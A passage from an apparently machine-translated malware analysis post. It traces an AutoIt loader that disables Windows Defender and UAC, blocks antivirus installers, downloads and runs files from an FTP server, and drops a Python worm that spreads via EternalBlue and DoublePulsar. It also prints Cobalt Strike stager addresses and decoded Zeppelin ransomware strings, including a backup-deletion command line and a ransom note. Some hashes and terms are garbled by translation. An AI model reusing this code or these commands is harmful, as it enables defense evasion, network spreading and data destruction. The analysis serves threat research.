"REG_DWORD", 1)<br/>	Sleep(50)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "REG_DWORD", 1)<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "REG_DWORD", 1)<br/>	Sleep(50)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRawWriteNotification", "REG_DWORD", 1)<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRawWriteNotification", "REG_DWORD", 1)<br/>	Sleep(50)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAltFirstSeen", "REG_DWORD", 1)<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAltFirstSeen", "REG_DWORD", 1)<br/>	Sleep(100)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "LocalSettingOverrideSpynetRepting", "REG_DWORD", 0)<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "LocalSettingOverrideSpynetRepting", "REG_DWORD", 0)<br/>	Sleep(100)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SumbitSamplesConsent", "REG_DWORD", 2)<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SumbitSamplesConsent", "REG_DWORD", 2)<br/>	Sleep(100)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions", "Exclusions_Paths", "REG_DWORD", 1)<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions", "Exclusions_Paths", "REG_DWORD", 1)<br/>	Sleep(100)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths", "C:\Programdata", "REG_SZ", "System")<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths", "C:\Programdata", "REG_SZ", "System")<br/>	Sleep(50)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths", "C:\Windows\System32", "REG_SZ", "SystemHD")<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths", "C:\Windows\System32", "REG_SZ", "SystemHD")<br/>	Sleep(50)<br/>	RegWrite("HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", 0)<br/>	RegWrite("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", 0)<br/>	Sleep(100)<br/>	RegWrite("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorAdmin", "REG_DWORD", 0)<br/>	RegWrite("HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorAdmin", "REG_DWORD", 0)<br/>	Sleep(100)<br/>	RegWrite("HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\ImmersiveShell", "UseActionCenterExperience", "REG_DWORD", 0)<br/>	RegWrite("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ImmersiveShell", "UseActionCenterExperience", "REG_DWORD", 0)<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "EnableBalloonTips", "REG_DWORD", 0)<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting", "disable", "REG_DWORD", 1)<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\PushNotifications", "ToastEnabled", "REG_DWORD", 0)<br/>	Sleep(100)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting", "DisableEnhancedNotifications", "REG_DWORD", 1)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress", "REG_DWORD", 1)<br/>	Sleep(100)<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "DisallowRun", "REG_DWORD", 1)<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "1", "REG_SZ", "eav_trial_rus.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "2", "REG_SZ", "avast_free_antivirus_setup_online.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "3", "REG_SZ", "eis_trial_rus.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "4", "REG_SZ", "essf_trial_rus.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "5", "REG_SZ", "hitmanpro_x64.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "6", "REG_SZ", "ESETOnlineScanner_UKR.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "7", "REG_SZ", "ESETOnlineScanner_RUS.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "8", "REG_SZ", "HitmanPro.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "9", "REG_SZ", "360TS_Setup_Mini.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "10", "REG_SZ", "Cezurity_Scanner_Pro_Free.exe")<br/>	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "11", "REG_SZ", "Cube.exe")</span></pre><p id="cb08" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">删除影子文件服务:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="08aa" class="kc kd hs jy b fi ke kf l kg kh">Run(@ComSpec &amp; " /c " &amp; "sc delete swprv", "", @SW_HIDE)</span></pre><p id="6a26" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">该脚本还将在最后执行一个请求，这可能是为了跟踪统计数据:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="23fb" class="kc kd hs jy b fi ke kf l kg kh">$iplog2 = "https://iplogger.org/1fCk97"<br/>InetRead($iplog2, 3)</span></pre><p id="156d" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">最终如前所述，脚本将引爆两个文件:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="66ff" class="kc kd hs jy b fi ke kf l kg kh">If @OSArch = "X64" Then<br/>	FileInstall("C:\2\taskhostw.exe", "C:\ProgramData\RealtekHD\taskhostw.exe")<br/>	Sleep(1000)<br/>	Run("C:\ProgramData\RealtekHD\taskhostw.exe")<br/>	FileInstall("C:\2\art.exe", "C:\ProgramData\install\art.exe")<br/>	Run("C:\ProgramData\install\art.exe")</span></pre><p id="530a" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">【art.exe】—d 08131d 236658401 c8 de 489596 ee 83992058 f 05176 CBD 8 b 72 add 89 fcea 57 e 37 c</p><p id="c616" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这是一个打包的CS stager，它将从以下位置下载信标:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="bb38" class="kc kd hs jy b fi ke kf l kg kh">185.153.196. 207/M7ph</span></pre><p id="888a" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">还带有与我们之前识别的CS相关文件相同的水印。另一个文件有点不同。</p><p id="b97e" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">【taskhostw.exe T4】3ac 1741 ee 7 DCF 04 CB 5 DBA 01d 82d 4232347 a 63697 f 0 ca 8 b 00661960 f 719 cade 23</p><p id="0d03" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这是一个64位Autoit编译的可执行文件，反编译显示该文件只是一个加载程序，它具有与前面讨论的相同的反检查，但也创建了一个标题为“YouWillBeMined2”的窗口，该窗口将用于检查它是否已经运行。</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="bd32" class="kc kd hs jy b fi ke kf l kg kh">GUICreate("YouWillBeMined2")</span></pre><p id="0d23" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">该脚本将从FTP服务器下载一个文件:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="8108" class="kc kd hs jy b fi ke kf l kg kh">$worked = "ONLINE"<br/>$server = "learinmica.com"<br/>$username = "alex"<br/>$pass = "easypassword"<br/>Local $open = _ftp_open("FTP")</span></pre><p id="e437" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">根据随后发生的检查判断，您可以推测这将涉及SMB扫描以进行传播:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="ace3" class="kc kd hs jy b fi ke kf l kg kh">If $worked = "ONLINE" Then<br/>	If $ftp_status = "ONLINE" Then<br/>		If @OSVersion &lt;&gt; "WIN_10" Then<br/>			If NOT FileExists("C:\Programdata\RunDLL\Doublepulsar-1.3.1.exe") OR NOT FileExists("C:\Programdata\RunDLL\Eternalblue-2.2.0.exe") OR NOT FileExists("C:\Programdata\RunDLL\rundll.exe") OR NOT FileExists("C:\Programdata\RunDLL\system.exe") OR NOT FileExists("C:\Programdata\RunDLL\start.exe") Then<br/>				ConsoleWrite("Downlading Scaner.dat" &amp; @CRLF)<br/>				Local $ftp_xmrigcpu64 = "scaner.dat"<br/>				Local $hopen = _ftp_open("FTP")<br/>				Local $hconn = _ftp_connect($hopen, $server, $username, $pass, 1)<br/>				Local $ftpg = _ftp_fileget($hconn, $ftp_xmrigcpu64, "C:\Programdata\WindowsTask" &amp; "\" &amp; $ftp_xmrigcpu64)<br/>				Local $isize = _ftp_filegetsize($hconn, "/" &amp; $ftp_xmrigcpu64)<br/>				ConsoleWrite($isize &amp; @CRLF)<br/>				Local $iftpc = _ftp_close($hconn)<br/>				Local $iftpo = _ftp_close($hopen)<br/>				FileSetAttrib("C:\ProgramData\WindowsTask\scaner.dat", "+SH")<br/>				Sleep(300)<br/>				FileMove("C:\Programdata\Windowstask\scaner.dat", "C:\Programdata\WindowsTask\scaner.exe")<br/>				FileSetAttrib("C:\ProgramData\WindowsTask\scaner.exe", "+SH")<br/>				Sleep(300)<br/>				Run("C:\Programdata\WindowsTask\scaner.exe -pnaxui")<br/>				Sleep(2000)<br/>				FileDelete("C:\Programdata\WindowsTask\scaner.dat")<br/>				FileDelete("C:\Programdata\WindowsTask\scaner.exe")<br/>				FileSetAttrib("C:\ProgramData\RunDLL\*.*", "+SH")<br/>				FileSetAttrib("C:\ProgramData\RunDLL", "+SH")<br/>			EndIf<br/>			Sleep(2000)<br/>			If NOT ProcessExists("system.exe") Then<br/>				If NOT ProcessExists("Msiexec64.exe") Then<br/>					If FileExists("C:\ProgramData\RunDLL\start.exe") Then<br/>						Run("C:\ProgramData\RunDLL\start.exe")<br/>						ConsoleWrite("Staring Scaner RunDLL.exe" &amp; @CRLF)<br/>					EndIf<br/>				EndIf<br/>			EndIf<br/>		EndIf</span></pre><p id="08d7" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">FTP服务器与某些CS设备在同一范围内:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="3f88" class="kc kd hs jy b fi ke kf l kg kh">learinmica .com.  600 IN A 31.44.184 .108</span></pre><p id="ae47" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated"><strong class="ir ht">scaner . dat—3 f 51 ab d78 e 607 BCD 707 CBD 2 f 4d 90 a3 d 02 D5 d 00 fa 07320 a 88838 c 373239 ee 6 D4 b</strong></p><p id="9601" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这个文件是一个有密码保护的自解压rar，密码是naxui从上面的脚本中引爆的。</p><p id="bbfa" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">打开文件后，我们只剩下一堆与永恒之蓝和DoublePulsar相关的文件，但上面的脚本主要与引爆start.exe有关</p><p id="dc20" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated"><strong class="ir ht">start.exe—54081 e 33 BCD 09d 29d 065533 c 230256 e 49 adff 2 edd 48 F5 EB 91 a 2434 c 03 DD 9 ECB 9</strong></p><p id="9efa" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这个文件是一个SFX RAR，里面有一个vbs，VBS文件只是引爆了另一个被解压缩的文件:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="7712" class="kc kd hs jy b fi ke kf l kg kh">Set WshShell = CreateObject("WScript.Shell") <br/>WshShell.Run "cmd.exe /c Rundll.exe", 0, false</span></pre><p id="d3f0" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated"><strong class="ir ht">rundll.exe—8b 58 e 3a 1 a 6a 11225050 af6c 82 e 92451779 c 0315 a 602d 19 ad 330 e 175 a 7 c 416 bf6</strong></p><p id="76be" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这是一个经过编译的python脚本，我们可以对其进行反编译:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="7a9a" class="kc kd hs jy b fi ke kf l kg kh">import subprocess<br/>import time<br/>import threading<br/>import socket<br/>import sys<br/>import random<br/>import os<br/>try:<br/>    MyIP = socket.gethostbyname_ex(socket.gethostname())[2]<br/>except:<br/>    MyIP = '10.0.0.2'<br/><br/>def EternalBlue(ip):<br/>    path = 'Eternalblue-2.2.0.exe'<br/>    inconfig = ' --inconfig Eternalblue-2.2.0.xml'<br/>    NetworkTimeout = ' --NetworkTimeout 60'<br/>    TargetIp = ' --TargetIp %s' % ip<br/>    TargetPort = ' --TargetPort 445'<br/>    Target = ' --Target WIN72K8R2'<br/>    summ = path + inconfig + NetworkTimeout + TargetIp + TargetPort + Target<br/>    PIPE = subprocess.PIPE<br/>    p = subprocess.Popen(summ, shell=True, stdin=PIPE, stdout=PIPE, stderr=subprocess.STDOUT)<br/>    output = p.communicate()<br/>    output = list(output)<br/>    output = output[0].split('\r\n')<br/>    if output.count('[+] CORE terminated with status code 0x00000000') == 1 and output.count('    [+] Ping returned Target architecture: x64 (64-bit)'):<br/>        x = 'good x64'<br/>        return x<br/>    elif output.count('[+] CORE terminated with status code 0x00000000') == 1 and output.count('    [+] Ping returned Target architecture: x86 (32-bit)'):<br/>        x = 'good x86'<br/>        return x<br/>    else:<br/>        x = 'not good'<br/>        return x<br/><br/><br/>def Pulsar(ip, arch, dll):<br/>    path = 'Doublepulsar-1.3.1.exe'<br/>    inconfig = ' --inconfig Doublepulsar-1.3.1.xml'<br/>    NetworkTimeout = ' --NetworkTimeout 60'<br/>    TargetIp = ' --TargetIp %s' % ip<br/>    TargetPort = ' --TargetPort 445'<br/>    DllPayload = ' --DllPayload %s' % dll<br/>    DllOrdinal = '  --DllOrdinal 1'<br/>    ProcessName = ' --ProcessName lsass.exe'<br/>    Protocol = ' --Protocol SMB'<br/>    Architecture = ' --Architecture %s' % arch<br/>    Function = ' --Fuction RunDll'<br/>    processCommandLine = ' --processCommandLine'<br/>    summ = path + inconfig + NetworkTimeout + TargetIp + TargetPort + Architecture + DllPayload + Protocol + DllOrdinal + Function + ProcessName + processCommandLine<br/>    PIPE = subprocess.PIPE<br/>    p = subprocess.Popen(summ, shell=True, stdin=PIPE, stdout=PIPE, stderr=subprocess.STDOUT)<br/>    output = p.communicate()<br/>    list(output)<br/>    output = output[0].split('\r\n')<br/><br/><br/>def scaner(ip):<br/>    try:<br/>        os.remove('Result.txt')<br/>    except:<br/>        pass<br/><br/>    Result = []<br/>    scan = 'system.exe TCP %s 445 150 /save' % ip<br/>    PIPE = subprocess.PIPE<br/>    p = subprocess.Popen(scan, shell=True, stdin=PIPE, stdout=PIPE, stderr=subprocess.STDOUT)<br/>    output = p.communicate()<br/>    for line in open('Result.txt', 'r').read().split('\n'):<br/>        if line.find('Open') &gt; 1:<br/>            Result.append(line.split(' ')[0])<br/><br/>    print Result<br/>    os.remove('Result.txt')<br/>    return Result<br/><br/><br/>def scaner_local(ip):<br/>    try:<br/>        os.remove('Result.txt')<br/>    except:<br/>        pass<br/><br/>    Result = []<br/>    scan = 'system.exe TCP %s 445 150 /save' % ip<br/>    PIPE = subprocess.PIPE<br/>    p = subprocess.Popen(scan, shell=True, stdin=PIPE, stdout=PIPE, stderr=subprocess.STDOUT)<br/>    output = p.communicate()<br/>    for line in open('Result.txt', 'r').read().split('\n'):<br/>        if line.find('Open') &gt; 1:<br/>            Result.append(line.split(' ')[0])<br/><br/>    for x in MyIP:<br/>        if x in Result:<br/>            Result.remove(x)<br/><br/>    os.remove('Result.txt')<br/>    return Result<br/><br/><br/>def attack(lst):<br/>    status = EternalBlue(lst)<br/>    if status == 'good x64':<br/>        Pulsar(lst, 'x64', 'x64.dll')<br/>        print 'Attack %s good' % lst<br/>    elif status == 'good x86':<br/>        Pulsar(lst, 'x86', 'x86.dll')<br/>        print 'Attack %s good' % lst<br/>    else:<br/>        print 'Attack %s not good!!!' % lst<br/><br/><br/>def attack2(lst):<br/>    status = EternalBlue(lst)<br/>    if status == 'good x64':<br/>        Pulsar(lst, 'x64', '2x64.dll')<br/>        print 'Attack %s good' % lst<br/>    elif status == 'good x86':<br/>        Pulsar(lst, 'x86', '2x86.dll')<br/>        print 'Attack %s good' % lst<br/>    else:<br/>        print 'Attack %s not good!!!' % lst<br/><br/><br/>def new_start():<br/>    print 'STARTED'<br/>    scanlist = []<br/>    lst = []<br/>    for line in open('scan.txt', 'r').read().split('\n'):<br/>        for unit in line.split(' '):<br/>            scanlist.append(unit)<br/><br/>    randomip = random.choice(scanlist)<br/>    lst = scaner(randomip)<br/>    for y in lst:<br/>        thread_ = threading.Thread(target=attack2, args=(y,)).start()<br/><br/>    while threading.active_count() &gt; 2:<br/>        time.sleep(5)<br/><br/>    print 'FINISHED'<br/><br/><br/>def start_local():<br/>    print 'STARTED_local'<br/>    lst = []<br/>    for ip in MyIP:<br/>        lst = scaner_local(ip + '/16')<br/>        for y in lst:<br/>            thread_ = threading.Thread(target=attack, args=(y,)).start()<br/><br/>        while threading.active_count() &gt; 2:<br/>            time.sleep(5)<br/><br/>    print 'FINISHED'<br/><br/><br/>def new_random():<br/>    print 'STARTED'<br/>    randomip = str(random.randint(1, 254)) + '.' + str(random.randint(0, 254)) + '.' + '0.' + '0'<br/>    print 'scan ' + randomip + '/16'<br/>    lst = scaner(randomip + '/16')<br/>    for y in lst:<br/>        thread_ = threading.Thread(target=attack, args=(y,)).start()<br/><br/>    while threading.active_count() &gt; 2:<br/>        time.sleep(5)<br/><br/>    print 'FINISHED'<br/><br/><br/>while True:<br/>    new_start()<br/>    start_local()</span></pre><p id="aa63" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">最终，该脚本使用DoublePulsar和永恒蓝来传播x86.dll、x64.dll、2x86.dll、2x64.dll文件，这些文件被证明是相当简单的下载程序:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="22ff" class="kc kd hs jy b fi ke kf l kg kh">User-Agent RookIE/1.0<br/>hxxp://learinmica.com/update/update[.]rar</span></pre><p id="0549" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">该文件将存储在ProgramData目录中，并引导至类似的Autoit可执行文件，以便使用scaner.dat和CS stagers，从而引导至更多的CS服务器:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="1201" class="kc kd hs jy b fi ke kf l kg kh">taskhosta.exe - e2f686f17b73398d949998e46c7fde48d0507b324a811df39cdd91531deb3d89</span></pre><p id="b3cb" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这是一个CS阶段，使用不同的水印并从以下位置下载信标:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="eca0" class="kc kd hs jy b fi ke kf l kg kh">31.44.184 .50/nECf</span></pre><p id="fd70" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">我们之前提到的另一个文件来自45.142.213[。]167:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="2350" class="kc kd hs jy b fi ke kf l kg kh">oxford.exe - 6e4459199d7fbdc4c215e595906e78fdd1c15ad3be6abed6540b80de17b63f3b</span></pre><p id="4606" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这是VegaLocker ransomware版本的齐柏林飞艇，我们可以快速解码机上的所有字符串:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="6e77" class="kc kd hs jy b fi ke kf l kg kh">&gt;&gt;&gt; import re<br/>&gt;&gt;&gt; t = re.findall('''\xff\xff\xff\xff.\x00\x00\x00''', data)<br/>&gt;&gt;&gt; len(t)<br/>268<br/>&gt;&gt;&gt; def decode(blah):<br/>...   rc4 = ARC4.new(blah[:0x20])<br/>...   return rc4.decrypt(blah[0x20:])<br/>... <br/>&gt;&gt;&gt; import struct<br/>&gt;&gt;&gt; for val in t:<br/>...   o = data.find(val)<br/>...   (a,b) = struct.unpack_from('&lt;II', data[o:])<br/>...   blob = data[o+8:o+8+b]<br/>...   try:<br/>...     print(decode(blob))<br/>...   except:<br/>...     pass<br/>...</span></pre><p id="f3b0" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">解码字符串的片段:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="73ee" class="kc kd hs jy b fi ke kf l kg kh">Software\Zeppelin\Process<br/>Software\Zeppelin\Process<br/>Software\Microsoft\Windows\CurrentVersion\Run\<br/>Software\Zeppelin<br/>&lt;/div&gt;<br/>NtQuerySystemInformation<br/>NtQuerySystemInformation<br/>&lt;/N&gt;&lt;D&gt;<br/>1767974731E6E223476E65712463554E87F55542B120AB1CE64651031B43D6AF4DECB1CF8ED6E71FED2376C3169F7A33AC239835D5AE800EFF4A4CEC847D37B1F903497DAB8909226A5FC3284932F26FB4C4BB6716A39011720116B935AA317E123441C0E287BEC5C16CF3522702AB447E1B2D03E0D8607C816023C0890C1C02CE1A366B9CA240F2497E879705AE6097F0A161F64A24217E1F912B1BCEA3BEB54223E0B0661F9BB8355ECF325EF669096F17CC00F2D2E1D2CB581D5A4A4FCB9218E98CF7A041C1B613E641FFBF76008172406C428E8462201FAC0CFCDFF6D63E4FEED77BA40080AFFEDA1267C6819688C4A3CBE52725DB8E68FC998B26B0A5071D<br/>1767974731E6E223476E65712463554E87F55542B120AB1CE64651031B43D6AF4DECB1CF8ED6E71FED2376C3169F7A33AC239835D5AE800EFF4A4CEC847D37B1F903497DAB8909226A5FC3284932F26FB4C4BB6716A39011720116B935AA317E123441C0E287BEC5C16CF3522702AB447E1B2D03E0D8607C816023C0890C1C02CE1A366B9CA240F2497E879705AE6097F0A161F64A24217E1F912B1BCEA3BEB54223E0B0661F9BB8355ECF325EF669096F17CC00F2D2E1D2CB581D5A4A4FCB9218E98CF7A041C1B613E641FFBF76008172406C428E8462201FAC0CFCDFF6D63E4FEED77BA40080AFFEDA1267C6819688C4A3CBE52725DB8E68FC998B26B0A5071D<br/><br/>{15F7DAB8-8C18-A41B-BFCD-C970AE422622}<br/>bcdedit /set {default} bootstatuspolicy ignoreallfailures;bcdedit /set {default} recoveryenabled no;wbadmin delete catalog -quiet;wbadmin delete systemstatebackup;wbadmin delete systemstatebackup -keepversions:0;wbadmin delete backup;wmic shadowcopy delete;vssadmin delete shadows /all /quiet;<br/>&lt;/N&gt;&lt;D&gt;<br/>boot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntdetect.com;ntldr;ntuser.dat;ntuser.dat.log;ntuser.ini;thumbs.db;<br/>:\$Windows.~bt\;:\System Volume Information\;:\Windows.old\;:\Windows\;:\intel\;:\nvidia\;:\inetpub\logs\;\All Users\;\AppData\;\Apple Computer\Safari\;\Application Data\;\Boot\;\Google\;\Google\Chrome\;\Mozilla Firefox\;\Mozilla\;\Opera Software\;\Opera\;\Tor Browser\;\Common Files\;\Internet Explorer\;\Windows Defender\;\Windows Mail\;\Windows Media Player\;\Windows Multimedia Platform\;\Windows NT\;\Windows Photo Viewer\;\Windows Portable Devices\;\WindowsPowerShell\;\Windows Photo Viewer\;\Windows Security\;\Embedded Lockdown Manager\;\Windows Journal\;\MSBuild\;\Reference Assemblies\;\Windows Sidebar\;\Windows Defender Advanced Threat Protection\;\Microsoft\;\Package Cache\;\Microsoft Help\;<br/>QueryFullProcessImageNameW<br/>Veeam.Backup.Manager.exe;Veeam.Backup.Agent.ConfigurationService.exe;Veeam.Backup.BrokerService.exe;Veeam.Backup.CatalogDataService.exe;Veeam.Backup.Satellite.exe;Veeam.Backup.Service.exe;veeam.backup.shell.exe;Veeam.Backup.WmiServer.exe;Veeam.Guest.Interaction.Proxy.exe;VeeamDeploymentSvc.exe;VeeamNetworkRedirector.exe;VeeamNFSSvc.exe;agntsvc.exe;agntsvc.exeagntsvc.exe;agntsvc.exeencsvc.exe;agntsvc.exeisqlplussvc.exe;anvir.exe;anvir64.exe;apache.exe;backup.exe;ccleaner.exe;ccleaner64.exe;dbeng50.exe;dbsnmp.exe;encsvc.exe;far.exe;firefoxconfig.exe;infopath.exe;isqlplussvc.exe;kingdee.exe;msaccess.exe;msftesql.exe;mspub.exe;mydesktopqos.exe;mydesktopservice.exe;mysqld-nt.exe;mysqld-opt.exe;mysqld.exe;ncsvc.exe;ocautoupds.exe;ocomm.exe;ocssd.exe;oracle.exe;oracle.exe;procexp.exe;regedit.exe;sqbcoreservice.exe;sql.exe;sqlagent.exe;sqlbrowser.exe;sqlserver.exe;sqlservr.exe;sqlwriter.exe;synctime.exe;taskkill.exe;tasklist.exe;taskmgr.exe;tbirdconfig.exe;tomcat.exe;tomcat6.exe;u8.exe;ufida.exe;visio.exe;xfssvccon.exe;<br/>.bat;.cmd;.com;.cpl;.dll;.msc;.msp;.pif;.scr;.sys;.log;.lnk;.zeppelin;<br/>!!! ALL YOUR FILES ARE ENCRYPTED !!!.TXT<br/>!!! ALL YOUR FILES ARE ENCRYPTED !!!<br/><br/>All your files, documents, photos, databases and other important files are encrypted.<br/>!!! YOUR FILES ARE ENCRYPTED !!!<br/>All your files, documents, photos, databases and other important<br/>files are encrypted.<br/>You are not able to decrypt it by yourself! There is only one method<br/>of recovering files it is purchase an unique private key.<br/><br/>Write to angry_war@protonmail.ch<br/><br/>Your personal ID: &lt;!--ID--&gt;<br/><br/>Attention!<br/> * Do not rename encrypted files.<br/> * Do not try to decrypt your data using third party software, it may cause permanent data loss.</span></pre><p id="6d9d" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">我们可以继续旋转一些钴罢工C2服务器，他们的管理端口是43890，而不是默认的50050，证书是静态的:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="925a" class="kc kd hs jy b fi ke kf l kg kh">s:C = US, ST = Washington, L = Redmond, O = Microsoft Corporation, OU = Microsoft Corporation, CN = Outlook.live.com</span></pre><p id="aa3a" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">几年前，我在一次当地会议上为<a class="ae jn" href="https://github.com/sysopfb/sslscan" rel="noopener ugc nofollow" target="_blank"> 